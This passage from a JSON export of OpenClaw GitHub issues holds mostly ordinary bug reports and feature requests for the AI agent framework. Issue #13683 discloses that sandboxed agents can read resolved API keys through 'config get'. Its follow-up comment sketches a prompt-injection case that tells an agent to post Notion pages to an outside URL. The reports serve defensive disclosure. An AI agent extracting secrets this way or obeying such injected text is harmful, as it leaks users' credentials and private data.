content before it gets summarized away. Without it, there's no reliable way to persist full conversation history for long-running sessions.\n\n### Environment\n\n- OpenClaw version: 2026.2.3-1 (stable)\n- OS: macOS 15.7.3 (arm64)\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9527",
      "createdAt": "2026-02-05T09:43:29Z",
      "updatedAt": "2026-02-10T22:50:12Z",
      "author": "theo-CD",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3857092416,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9527#issuecomment-3857092416",
          "createdAt": "2026-02-06T00:14:46Z",
          "updatedAt": "2026-02-06T00:14:46Z",
          "author": "vincentkoc",
          "body": "@theo-CD resolving hook logic for these and other hooks in https://github.com/openclaw/openclaw/pull/9761"
        },
        {
          "id": 3880936654,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9527#issuecomment-3880936654",
          "createdAt": "2026-02-10T21:52:31Z",
          "updatedAt": "2026-02-10T21:52:31Z",
          "author": "unboxed-ai",
          "body": "This is blocking memory preservation plugins. We built a custom memory-recall plugin that needs to save conversation snapshots before compaction and inject them after — the hooks are defined in the API surface (`runBeforeCompaction`/`runAfterCompaction` in extensionAPI.js) but never called from the compaction code path.\n\nCurrent workaround: detect compaction via message count drop in `before_agent_start` and save snapshots at `agent_end`. Works but fragile compared to proper lifecycle hooks.\n\nWould love to see this wired up — it's a 2-line fix to call `hookRunner.runBeforeCompaction()` / `hookRunner.runAfterCompaction()` in the compaction function."
        },
        {
          "id": 3881148882,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9527#issuecomment-3881148882",
          "createdAt": "2026-02-10T22:49:23Z",
          "updatedAt": "2026-02-10T22:50:12Z",
          "author": "vincentkoc",
          "body": "> This is blocking memory preservation plugins. We built a custom memory-recall plugin that needs to save conversation snapshots before compaction and inject them after — the hooks are defined in the API surface (`runBeforeCompaction`/`runAfterCompaction` in extensionAPI.js) but never called from the compaction code path.\n> \n> Current workaround: detect compaction via message count drop in `before_agent_start` and save snapshots at `agent_end`. Works but fragile compared to proper lifecycle hooks.\n> \n> Would love to see this wired up — it's a 2-line fix to call `hookRunner.runBeforeCompaction()` / `hookRunner.runAfterCompaction()` in the compaction function.\n\n@unboxed-ai its never a two line fix, esp with a vibe coded repo of this size. See my PR https://github.com/openclaw/openclaw/pull/12580/changes#diff-fb8930be8704af23c5341c03753d77b6e28b20c1e2ba26ff4c040ca024023bb4"
        }
      ]
    },
    {
      "number": 13701,
      "title": "Telegram Inbound Messages Not Reaching Gateway (Polling Mode)",
      "body": "### Description\nTelegram inbound messages are not reaching the OpenClaw gateway when using polling mode, despite the channel status being 'OK' and outbound messages (via curl and gateway) working correctly.\n\n### Environment\n- **OpenClaw Version:** 2026.2.9 (33c75cb)\n- **Node Version:** v24.13.0 (also tested on v25.6.0)\n- **OS:** macOS 15.7.3 (arm64)\n- **Channel Configuration:** Polling mode (dmPolicy: 'pairing' or 'allow')\n\n### Diagnostic Steps Taken\n1. **Outbound Test:** Confirmed that  POST to  works perfectly.\n2. **Manual Poll Conflict:** Running a manual  loop while the gateway was active resulted in . This confirms the gateway is actively polling the Telegram API.\n3. **Manual Poll Result:** When the gateway was temporarily stopped (or during a 409 conflict window), manual  polling successfully retrieved pending messages (including mentions and direct messages).\n4. **Gateway Silence:** Despite the gateway successfully winning the poll competition (indicated by the manual curl getting 409s), the messages never appeared in the gateway's inbound logs and were not processed by the agent.\n5. **Session Management:** Revoked bot tokens, deleted/recreated the bot, and restarted the gateway multiple times. The issue persists across fresh tokens and bot identities.\n\n### Observation\nThe gateway appears to be successfully retrieving messages from the Telegram API (consuming them so they disappear from the queue) but failing to internalize/process them after the fetch. No specific hand-off errors were found in the main logs.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13701",
      "createdAt": "2026-02-10T22:34:50Z",
      "updatedAt": "2026-02-10T22:41:49Z",
      "author": "Kushmaro",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881123997,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13701#issuecomment-3881123997",
          "createdAt": "2026-02-10T22:41:49Z",
          "updatedAt": "2026-02-10T22:41:49Z",
          "author": "Kushmaro",
          "body": "### Additional Diagnostic Data\nObservation during a config hot-reload (changing  or  status):\nThe gateway logs show an  from  immediately following the hot reload application. This may indicate the previous polling request is being aborted but perhaps the subsequent listener isn't re-initializing correctly or is entering a stalled state.\n\n**Log Snippet:**\n```\n22:38:17 info gateway/reload {\"subsystem\":\"gateway/reload\"} config hot reload applied (channels.telegram.enabled, channels.telegram.dmPolicy)\n22:38:17 warn [openclaw] Suppressed AbortError: AbortError: This operation was aborted at node:internal/deps/undici/undici:16416:13\n```"
        }
      ]
    },
    {
      "number": 13703,
      "title": "TUI/webchat: Messages occasionally truncated mid-sentence",
      "body": "## Description\n\nMessages from the assistant are occasionally truncated in the OpenClaw TUI (terminal webchat). The user sees only a partial response — sometimes just a few characters (e.g. `NO_` instead of full message).\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9\n- **OS:** macOS 15 (Darwin 25.2.0, arm64 / Apple M1)\n- **Node:** v25.5.0\n- **Terminal:** macOS Terminal.app / default shell\n- **Channel:** webchat (TUI)\n\n## Steps to reproduce\n\n1. Run OpenClaw TUI on macOS\n2. Have a conversation with the agent\n3. Observe that some responses are cut off mid-sentence\n\n## Behavior\n\n- **Intermittent** — does not happen on every message\n- **Only affects TUI/webchat** — Telegram delivery is unaffected\n- Both short messages (e.g. NO_REPLY → shows `NO_`) and longer responses can be truncated\n- The full response appears to be generated (backend side), but the TUI does not render it completely\n- Scrolling or refreshing does not recover the full text\n\n## Expected behavior\n\nFull assistant response should be visible in the TUI.\n\n## Notes\n\n- Telegram channel works correctly for the same session\n- TUI is connected via LAN (m4 → m1), so network latency is not a factor\n- Could be a terminal buffer, streaming, or rendering issue in the webchat client",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13703",
      "createdAt": "2026-02-10T22:37:24Z",
      "updatedAt": "2026-02-10T22:37:24Z",
      "author": "Hovhas",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "web-ui",
          "tui",
          "websocket"
        ]
      }
    },
    {
      "number": 13702,
      "title": "Merged model contextWindow override not applied to isolated/cron/sub-agent sessions",
      "body": "## Bug Description\n\nMerged model `contextWindow` override is applied to the main agent session but **not** to isolated (cron/sub-agent) sessions.\n\n## Config\n\n```json\n\"models\": {\n  \"mode\": \"merge\",\n  \"providers\": {\n    \"anthropic\": {\n      \"baseUrl\": \"https://api.anthropic.com\",\n      \"api\": \"anthropic-messages\",\n      \"models\": [{\n        \"id\": \"claude-opus-4-6\",\n        \"name\": \"Claude Opus 4.6\",\n        \"reasoning\": true,\n        \"input\": [\"text\"],\n        \"contextWindow\": 1000000,\n        \"maxTokens\": 128000\n      }]\n    }\n  }\n},\n\"agents\": {\n  \"defaults\": {\n    \"model\": { \"primary\": \"anthropic/claude-opus-4-6\" },\n    \"contextTokens\": 1000000,\n    \"subagents\": {\n      \"model\": \"anthropic/claude-opus-4-6\"\n    }\n  }\n}\n```\n\n## Expected Behavior\n\nAll sessions using `anthropic/claude-opus-4-6` should resolve `contextWindow` as 1,000,000 tokens (from the merged provider config).\n\n## Actual Behavior\n\n- **Main session**: correctly shows `263k/1000k` ✅\n- **Cron/sub-agent sessions**: show `*/200k` ❌ (built-in catalog default)\n\nVerified via `openclaw status` (sessions table) and `session_status` tool.\n\n`agents.defaults.contextTokens` is set to `1000000` but the docs state it acts as a cap (`min`), so it cannot *raise* the model's resolved context window. The root issue is that the merged model override for `contextWindow` is not being used during model resolution for spawned (isolated) sessions.\n\n## Environment\n\n- OpenClaw: 2026.2.9 (stable, npm)\n- OS: macOS 26.2 (arm64)\n- Node: 25.6.0\n\n## Workaround\n\nNone found. `agents.defaults.contextTokens` only caps the window and cannot increase it above the resolved model `contextWindow`. There is no `contextTokens` field under `agents.defaults.subagents` in the schema.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13702",
      "createdAt": "2026-02-10T22:36:46Z",
      "updatedAt": "2026-02-10T22:36:46Z",
      "author": "evity-squibbon",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 6334,
      "title": "[Bug]: voice-call with Twilio fails when specifying a port in the webhook",
      "body": "## Summary\n\nvoice-call with Twilio requires you provide Twilio a webhook url so Twilio can request instructions about the call and update voice-call with status.  When that webhook url contains a port (e.g. https://my.server.com:8443/), the webhook will fail.  This is because voice-call tries to verify the x-twilio-signature header with a different algorithm than what Twilio uses.  When voice-call sees the signature mis-match, it returns a 401 to Twilio and the call fails.\n\n## Steps to reproduce\n\n1.  Setup voice-call skill with Twilio\n2.  Create a Twilio webhook back to voice-call that contains a port (e.g. 80, 443, 8443, 3340)\n3.  Try to make a call via voice-call skill and note that the Twilio logs show a 401 and the call fails.\n\n## Expected behavior\n\nx-twilio-signature verification in voice-call should match the signature provided by Twilio.  We should check the signature the exact same way Twilio's official signature verification works by either using the Twilio library or accepting signatures generated with and without the port.\n\n## Actual behavior\n\nTwilio generates the signature hash by using a URL without the port specifier.  voice-call generates the signature hash with the port.  The signatures don't match.\n\n## Environment\n\n- Clawdbot version: Openclaw 2026-1-30\n- OS: Linux\n- Install method (pnpm/npx/docker/etc): pnpm\n\n## Logs or screenshots\n\n[Line 132 here](https://www.npmjs.com/package/twilio?activeTab=code) shows the official Twilio package testing the signature with and without a port.  \n[This line in voice-call](https://github.com/openclaw/openclaw/blob/28a05f994092c52e5e84a66b267b8aa47f592d38/extensions/voice-call/src/webhook-security.ts#L23) just uses the URL as-is without testing with/without the port.\n\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6334",
      "createdAt": "2026-02-01T15:09:14Z",
      "updatedAt": "2026-02-10T22:33:23Z",
      "author": "rsteckler",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3875456700,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6334#issuecomment-3875456700",
          "createdAt": "2026-02-10T05:41:28Z",
          "updatedAt": "2026-02-10T05:41:28Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3881002177,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6334#issuecomment-3881002177",
          "createdAt": "2026-02-10T22:09:30Z",
          "updatedAt": "2026-02-10T22:09:30Z",
          "author": "rcritz",
          "body": "## Additional findings: Twilio is inconsistent between webhook types\n\nWe independently hit this same issue and discovered an important detail the original report missed:\n\n**Twilio is inconsistent with non-standard ports in signature computation:**\n- **TwiML webhook** (`Url` parameter in the Calls API): Twilio signs **WITHOUT** the port\n- **Status callback** (`StatusCallback` parameter): Twilio signs **WITH** the port\n\nThis means simply stripping the port before validation won't fully fix it — you need to try both URL forms.\n\n### How we confirmed this\n\nWe captured the full POST body and `X-Twilio-Signature` header from both request types, then computed HMAC-SHA1 signatures against every URL permutation (with/without port, with/without query string). For TwiML webhooks, only the portless URL matched. For status callbacks, only the URL with port matched.\n\n### Suggested fix\n\nIn `verifyTwilioWebhook()` in `webhook-security.ts`, after the initial `validateTwilioSignature()` fails, try the alternate URL form before rejecting:\n\n```typescript\n// After initial validation fails, try alternate port form\nif (options?.publicUrl) {\n  try {\n    const pubUrl = new URL(options.publicUrl);\n    if (pubUrl.port) {\n      const altUrl = new URL(verificationUrl);\n      if (altUrl.port) {\n        altUrl.port = \"\";           // try WITHOUT port\n      } else {\n        altUrl.port = pubUrl.port;  // try WITH port\n      }\n      const altVerificationUrl = altUrl.toString();\n      const isValidAlt = validateTwilioSignature(authToken, signature, altVerificationUrl, params);\n      if (isValidAlt) {\n        return { ok: true, verificationUrl: altVerificationUrl };\n      }\n    }\n  } catch {\n    // ignore URL parse errors\n  }\n}\n```\n\nThis is consistent with Twilio's own official library behavior ([line 132 in the twilio npm package](https://www.npmjs.com/package/twilio?activeTab=code)) which tests both with and without port.\n\n### Environment\n- OpenClaw 2026.2.9\n- Tailscale Funnel on port 8443 (separate from serve on 443 for security)\n- Twilio provider with `publicUrl: https://host:8443/voice/webhook`\n\n### Workaround\nWe patched `webhook-security.ts` locally — works for both TwiML and status callbacks. The patch gets overwritten on updates, so an upstream fix would be appreciated.\n\nAlternatively, `skipSignatureVerification: true` in the voice-call config works but is not recommended for production."
        },
        {
          "id": 3881095755,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6334#issuecomment-3881095755",
          "createdAt": "2026-02-10T22:33:23Z",
          "updatedAt": "2026-02-10T22:33:23Z",
          "author": "rsteckler",
          "body": "I did the same - patched to test both with and without.  I also submitted a PR, but the PR was rejected as minimally helpful and the bug is marked stale.  I empathize with the project owners - there is a LOT happening right now for them.\nI created a fixup script I can apply each time I update openclaw - that seems like the most reasonable approach for the medium term."
        }
      ]
    },
    {
      "number": 13700,
      "title": "[Feature Request]: Session snapshots — save and load context checkpoints (/session save|load)",
      "body": "## Problem\n\nDuring long development sessions, users sometimes want to:\n- Test alternative approaches without losing current progress\n- Roll back to a known-good state after mistakes\n- A/B test different prompts or models in parallel\n- Branch conversations without manual transcripts\n\nCurrently, OpenClaw saves sessions automatically, but there's no way to:\n1. Create an explicit checkpoint at a specific moment\n2. Reload that exact state (messages + context window + model choice)\n3. Fork a session into parallel branches\n\n## Proposed Solution\n\nAdd `/session save <name>` and `/session load <name>` commands:\n\n```bash\n# Save current session (all messages, context, model state) to checkpoint\n/session save healthcheck-baseline\n\n# Later, reset current session and restore from checkpoint\n/session load healthcheck-baseline\n# Result: Current session cleared, full context restored to that exact moment\n```\n\n## Use Cases\n\n1. **A/B Testing**: Save baseline config, test variant A, load baseline, test variant B\n2. **Rollback**: Save before risky commands, revert if things break\n3. **Branching**: Fork a conversation to explore multiple paths\n4. **Reproducibility**: Save working states for debugging or sharing\n\n## Implementation Sketch\n\n```typescript\n// Save checkpoint\nPOST /sessions/{sessionKey}/checkpoints/{name}\n- Captures: transcript, context tokens, model, compaction state\n- Stores: workspace/session-checkpoints/{sessionKey}-{name}.jsonl\n\n// Load checkpoint  \nPOST /sessions/{sessionKey}/restore/{name}\n- Clears: current transcript\n- Restores: checkpoint transcript, context, model\n- Effect: Like /reset + history injection, but deterministic\n```\n\n## Related Issues\n\n- #8185: Memory flush on /new and /reset (pre-reset memory save)\n- #11799: session:compacted hook event (post-compaction recovery)\n- #12297: sessions_kill/cleanup tools (session lifecycle)\n\n## Environment\n\n- OpenClaw 2026.2.9\n- User: Developer workstation (local + Telegram relay)\n- Use case: Long-running development sessions with context preservation",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13700",
      "createdAt": "2026-02-10T22:30:35Z",
      "updatedAt": "2026-02-10T22:30:35Z",
      "author": "gbacskai",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13338,
      "title": "[Bug]: Dashboard cannot modify agent primary model or environment variables",
      "body": "## Summary\n\nThe Dashboard UI does not allow modifying certain agent-level and global settings that are correctly defined in `openclaw.json`. Specifically:\n\n1. **Agent primary model**: Cannot change the primary model assigned to an agent (e.g., the `main` agent's model appears \"locked\" to Claude in the UI, even though the JSON config is correct)\n2. **Environment variables**: Cannot edit `env.vars` values through the Dashboard\n\nBoth settings work correctly when edited directly in `openclaw.json` and restarting the gateway. The issue is UI-only.\n\n## Steps to reproduce\n\n1. Open Dashboard → Agents → select any agent (e.g., `main`)\n2. Try to change the primary model → the dropdown/field appears locked or doesn't save\n3. Open Dashboard → Config → Environment → Vars\n4. Try to edit a variable value → changes don't persist\n\n## Expected behavior\n\nDashboard should allow editing agent models and environment variables, then persist changes to `openclaw.json`.\n\n## Actual behavior\n\nUI fields appear locked or changes are silently discarded. The only workaround is editing the JSON file directly.\n\n## Environment\n\n- OpenClaw version: latest (as of 2026-02-10)\n- OS: macOS (Darwin 25.2.0, arm64)\n- Install method: pnpm (global)\n- Node: v22.22.0\n\n## Notes\n\nThis has been observed since at least 2026-02-07. The underlying config structure is valid — `agents.list[].model` is an object `{primary, fallbacks}` and works correctly when set via JSON. The Dashboard may not be handling the object format properly.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13338",
      "createdAt": "2026-02-10T11:16:08Z",
      "updatedAt": "2026-02-10T22:30:28Z",
      "author": "liaponzo33-sketch",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881086143,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13338#issuecomment-3881086143",
          "createdAt": "2026-02-10T22:30:28Z",
          "updatedAt": "2026-02-10T22:30:28Z",
          "author": "lvkelv",
          "body": "I have the same problem"
        }
      ]
    },
    {
      "number": 13697,
      "title": "False positive billing errors for successful subagent completions",
      "body": "# OpenClaw Bug Report: False Positive Billing Errors\n\n**Date:** 2026-02-10  \n**Reporter:** Atlas Baron  \n**Severity:** Medium (misleading error messages, work actually completes)  \n**Component:** Subagent completion reporting / summary generation\n\n---\n\n## Summary\n\nOpenClaw is incorrectly reporting \"billing error - API key has run out of credits\" for subagent sessions that complete successfully. The actual API calls succeed (stopReason: \"stop\", tokens charged, work delivered), but the completion summary shows a billing error.\n\n---\n\n## Evidence\n\n### Affected Sessions (2026-02-10)\n\n1. **Session:** `agent:main:subagent:4a20d7e9-d807-4182-87aa-5e6653190ceb` (epic-i1-manual-invoice-opus)\n   - **Model:** Anthropic Claude Opus 4.5\n   - **Reported:** \"⚠️ API provider returned a billing error\"\n   - **Actual status:** Succeeded\n   - **Runtime:** 6m21s\n   - **Tokens:** 90.2k input, 584 output\n   - **Work delivered:** Yes (no files modified, but session completed normally)\n\n2. **Session:** `agent:main:subagent:502c39fb-5eb5-44cb-b31f-5f4e8b1b9cc3` (epic-i3-void-cancel-codex-retry)\n   - **Model:** OpenAI gpt-5.2-codex\n   - **Reported:** \"⚠️ API provider returned a billing error\"\n   - **Actual status:** Succeeded\n   - **Runtime:** 1m16s\n   - **Tokens:** 31.8k input, 908 output\n   - **Work delivered:** Yes (code already existed, agent correctly identified this)\n\n3. **Session:** `agent:main:subagent:ba21bdd3-83a3-484d-a8e8-89568346cc1e` (epic-j5-reconciliation-codex)\n   - **Model:** OpenAI gpt-5.2-codex\n   - **Reported:** \"⚠️ API provider returned a billing error\"\n   - **Actual status:** Succeeded\n   - **Runtime:** 5m55s\n   - **Tokens:** 67.1k input, 1.7k output\n   - **Cost:** $0.14\n   - **Work delivered:** Yes (payment reconciliation report fully implemented)\n   - **Transcript evidence:**\n     ```json\n     {\n       \"message\": {\n         \"role\": \"assistant\",\n         \"stopReason\": \"stop\",\n         \"usage\": {\n           \"input\": 67141,\n           \"output\": 1696,\n           \"totalTokens\": 68837,\n           \"cost\": {\n             \"input\": 0.11749675,\n             \"output\": 0.023744,\n             \"total\": 0.14124075\n           }\n         }\n       }\n     }\n     ```\n\n---\n\n## Analysis\n\n**Transcript inspection shows:**\n- Final message has `stopReason: \"stop\"` (normal completion)\n- No error messages in message.errorMessage\n- Tokens charged normally\n- Usage costs calculated\n- Work completed and committed to git\n\n**The billing error is NOT coming from the provider API response.** It appears to be generated by OpenClaw's completion summary system after the fact.\n\n---\n\n## Impact\n\n**User confusion:** The error message suggests credits are depleted and action is needed (top up, switch keys), when actually:\n- Credits are fine\n- API calls succeeded\n- Work was delivered\n- No action required\n\n**Workflow disruption:** Caused unnecessary retries, debugging sessions, and discussion about credit status when the real issue is a reporting bug.\n\n**Trust erosion:** When the system incorrectly reports billing failures, it reduces confidence in actual error messages.\n\n---\n\n## Reproduction Steps\n\n1. Spawn a Codex or Opus subagent with a moderately complex task (4-6 min runtime, 30k-70k tokens)\n2. Let it run to completion\n3. Observe completion message\n\n**Expected:** \"Findings: [actual work summary]\"  \n**Actual:** \"⚠️ API provider returned a billing error — your API key has run out of credits...\"\n\n**Note:** Does not happen on every subagent, but happened 3 times on 2026-02-10 across both OpenAI and Anthropic models.\n\n---\n\n## Hypothesis\n\nPossible causes:\n1. **Rate limit misinterpretation:** API returned a transient rate limit that was resolved on retry, but summary system saw the initial error\n2. **Completion status parsing bug:** Summary generator is reading error state from wrong field in transcript\n3. **False positive on cost calculation:** If cost calculation fails/times out, system assumes billing error\n4. **Provider response format change:** Recent API update changed response structure, breaking OpenClaw's error detection\n\n---\n\n## Recommended Fix\n\n1. **Validate error source:** Only report billing errors if they appear in the final API message's errorMessage field\n2. **Check stopReason:** If stopReason is \"stop\", ignore any prior error state\n3. **Cost as evidence:** If usage.cost exists and > 0, API call succeeded (can't charge if no credits)\n4. **Add debug logging:** Include actual error message and source in bug reports for easier diagnosis\n\n---\n\n## Workaround (for agents)\n\nWhen receiving \"billing error\" completion:\n1. Check `git status` - did files change?\n2. Check session transcript - does final message have stopReason: \"stop\"?\n3. If yes to either → work succeeded, commit and continue\n4. If no → actual failure, retry with fallback model\n\n---\n\n## Files\n\n- Transcript examples: `~/.openclaw/agents/main/sessions/*.jsonl`\n- Session IDs listed above\n\n---\n\n**Status:** Open  \n**Assignee:** OpenClaw maintainers  \n**Priority:** Medium (misleading but not blocking)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13697",
      "createdAt": "2026-02-10T22:19:59Z",
      "updatedAt": "2026-02-10T22:19:59Z",
      "author": "mikebaron",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13693,
      "title": "Proposal: Organization session mode (not planned)",
      "body": "## Summary\n\nExploring multi-user permission scopes within a single agent session.\n\n## Motivation\n\nSmall teams sharing one agent currently get uniform access via `allowFrom`. Per-user domain restrictions could be useful but adds complexity.\n\n## Sketch\n\n```yaml\nsession:\n  mode: \"organization\"\n  governance:\n    admin:\n      - match: \"+1555000XXXX\"\n    principals:\n      - id: \"user-a\"\n        match: \"+1555001XXXX\"\n        domains: [\"scheduling\"]\n      - id: \"user-b\"\n        match: \"+1555002XXXX\"\n        domains: [\"inventory\"]\n```\n\n## Status\n\nNot planned — prompt-level roles + `allowFrom` cover this well enough.",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13693",
      "createdAt": "2026-02-10T21:55:21Z",
      "updatedAt": "2026-02-10T22:17:20Z",
      "author": "JorgeAlan",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13683,
      "title": "Security: Sandboxed agents can read resolved API secrets via config",
      "body": "## Summary\n\nSandboxed agents can extract API secrets by reading the resolved config values. When environment variables like `${NOTION_API_KEY}` are substituted in the config, the resolved values (actual API keys) are exposed through the `config get` CLI command and API responses.\n\n## Steps to Reproduce\n\n1. Configure an API key using env var substitution in `openclaw.json`:\n   ```json\n   {\n     \"someService\": {\n       \"apiKey\": \"${MY_API_KEY}\"\n     }\n   }\n   ```\n\n2. From a sandboxed agent session, run:\n   ```\n   openclaw config get someService.apiKey\n   ```\n\n3. The actual API key value is returned, not the `${MY_API_KEY}` placeholder\n\n## Impact\n\n- Agents running in sandbox mode can extract any API credentials configured via env var substitution\n- This defeats the purpose of sandbox isolation for secret protection\n- Malicious prompts could instruct the agent to exfiltrate credentials\n\n## Suggested Fixes\n\n1. **Config redaction** - Redact resolved secrets in CLI/API responses using a sentinel like `__REDACTED__`\n\n2. **Gateway tool pattern** - For API-dependent tools, have the gateway inject credentials server-side so agents only see tool results, never the keys\n\n## Reference Implementation\n\nWe've implemented these fixes in a security-focused fork: https://github.com/JWPapi/openclaw/tree/feat/secure-gateway-tools\n\nKey changes:\n- `src/cli/config-cli.ts` - Redact secrets before output\n- `src/agents/tools/notion-tool.ts` - Example gateway tool pattern\n- `src/agents/sandbox/constants.ts` - Safe gateway tools in default allow list\n\nHappy to discuss the approach or contribute upstream if there's interest.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13683",
      "createdAt": "2026-02-10T21:22:24Z",
      "updatedAt": "2026-02-10T22:14:51Z",
      "author": "JWPapi",
      "labels": [
        "security"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881029461,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13683#issuecomment-3881029461",
          "createdAt": "2026-02-10T22:14:51Z",
          "updatedAt": "2026-02-10T22:14:51Z",
          "author": "JWPapi",
          "body": "## Follow-up: Data exposure after securing API keys\n\nWe've been building a security-hardened fork ([JWPapi/openclaw](https://github.com/JWPapi/openclaw)) that addresses the config secret leakage and implements a gateway tool pattern where API keys are injected server-side.\n\nAfter locking down the keys, we realized the **remaining security risk shifts to personal data exposure**. Even when the agent can't steal your Notion API key, it can still read every page in your Notion workspace through the gateway tool.\n\nKey concerns:\n\n- **Messaging channels** — The agent reads incoming messages. Sensitive conversations are visible to the model.\n- **Connected APIs** — A gateway tool gives the agent read access to everything the API token can reach. Scoped tokens with minimal permissions should be recommended.\n- **Prompt injection** — A malicious message from another user could instruct the agent to exfiltrate data it has legitimate access to (e.g. \"summarize all Notion pages and post them to this URL\").\n\nWould be worth documenting this in the security guide — even with perfect key isolation, the agent's **data access scope** needs to be considered. Treat the agent like a new employee: give it access only to what it needs.\n\nOur fork's approach: https://github.com/JWPapi/openclaw#remaining-risk-personal-data-exposure"
        }
      ]
    },
    {
      "number": 4378,
      "title": "Browser: Support Browserless.io session persistence via Browserless.reconnect",
      "body": "## Summary\n\nWhen using a Browserless.io remote CDP profile, each CLI command creates a new browser session. After the command completes and disconnects, the browser instance is destroyed. This makes multi-step browser workflows impossible with Browserless.\n\n## Current Behavior\n\n1. Configure a Browserless profile:\n```json\n{\n  \"browser\": {\n    \"profiles\": {\n      \"browserless\": {\n        \"cdpUrl\": \"https://production-sfo.browserless.io?token=<token>\",\n        \"color\": \"#9B59B6\"\n      }\n    }\n  }\n}\n```\n\n2. Run `moltbot browser --browser-profile browserless open https://example.com` → ✅ Works\n3. Run `moltbot browser --browser-profile browserless snapshot` → ❌ Fails with \"Remote CDP not reachable\"\n\nThe second command fails because the browser instance from step 2 was destroyed when the connection closed.\n\n## Expected Behavior\n\nBrowser sessions with Browserless should persist across commands, allowing multi-step workflows like:\n- Open a page\n- Take a screenshot\n- Fill a form\n- Submit and capture results\n\n## Suggested Implementation\n\nBrowserless provides a `Browserless.reconnect` CDP command for session persistence:\n\n1. Before disconnecting, call `cdp.send(\"Browserless.reconnect\", { timeout: 60000 })` to get a reconnection endpoint\n2. Store the reconnection endpoint with the profile state\n3. On next command, use the stored endpoint instead of creating a new session\n4. Handle reconnection timeouts (varies by Browserless plan: 10s free, 1min starter, 5min scale)\n\nReference: Browserless session management docs describe this flow.\n\n## Workarounds\n\n- Use the local container browser for multi-step workflows\n- Use Jina Reader skill for content extraction\n- Use Firecrawl for anti-bot static page fetching\n\n## Environment\n\n- Moltbot: 2026.1.27-beta.1\n- Platform: Docker on Linux (Hetzner VPS)\n- Browserless: production-sfo endpoint",
      "state": "closed",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4378",
      "createdAt": "2026-01-30T04:53:49Z",
      "updatedAt": "2026-02-10T22:12:57Z",
      "author": "tonydehnke",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3822033935,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4378#issuecomment-3822033935",
          "createdAt": "2026-01-30T06:05:21Z",
          "updatedAt": "2026-01-30T06:05:21Z",
          "author": "tonydehnke",
          "body": "## Update: Workaround Found\n\nAfter more testing, I've confirmed the issue and found a workaround.\n\n### Root Cause\nThe browser tool's multi-step workflow fails because each tool call creates a new CDP connection:\n1. `open` action → creates session, opens page → **session destroyed when tool call completes**\n2. `snapshot` action → tries to reconnect → **fails because session is gone**\n\nThe agent correctly uses `profile=\"browserless\"`, but Browserless sessions are ephemeral per-connection.\n\n### Workaround: Use Browserless REST API\n\nInstead of the browser tool, use the Browserless REST API directly via `exec`/curl:\n\n```bash\ncurl -s -X POST \"https://production-sfo.browserless.io/content?token=YOUR_TOKEN\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"url\": \"https://example.com\"}'\n```\n\nThis completes in a single request, avoiding the session persistence issue.\n\n### Available REST Endpoints\n- `/content` - Get fully rendered HTML\n- `/screenshot` - Capture PNG screenshot\n- `/scrape` - Extract structured data with selectors\n\n### What Would Fix This Properly\nImplementing `Browserless.reconnect` CDP command support, which allows keeping sessions alive between disconnections (up to 10s on free tier, longer on paid plans).\n\nFor now, the REST API workaround works well for content extraction use cases."
        },
        {
